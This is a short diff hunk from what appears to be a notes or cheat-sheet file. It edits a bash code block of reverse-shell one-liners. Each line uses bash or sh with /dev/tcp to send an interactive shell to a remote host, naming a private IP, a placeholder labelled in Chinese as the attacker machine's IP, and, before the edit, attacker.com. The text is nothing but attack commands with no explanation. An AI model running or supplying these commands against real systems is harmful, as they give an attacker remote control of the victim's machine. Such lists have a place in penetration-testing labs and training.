@@ -11,7 +11,7 @@
 ```bash
 bash -i >& /dev/tcp/172.26.224.230/9999 0>&1
 sh -i >& /dev/tcp/攻击机IP/4444 0>&1
-bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1'
+bash -c 'exec bash -i &>/dev/tcp/192.168.56.1/8888 <&1'
 
 ```
 
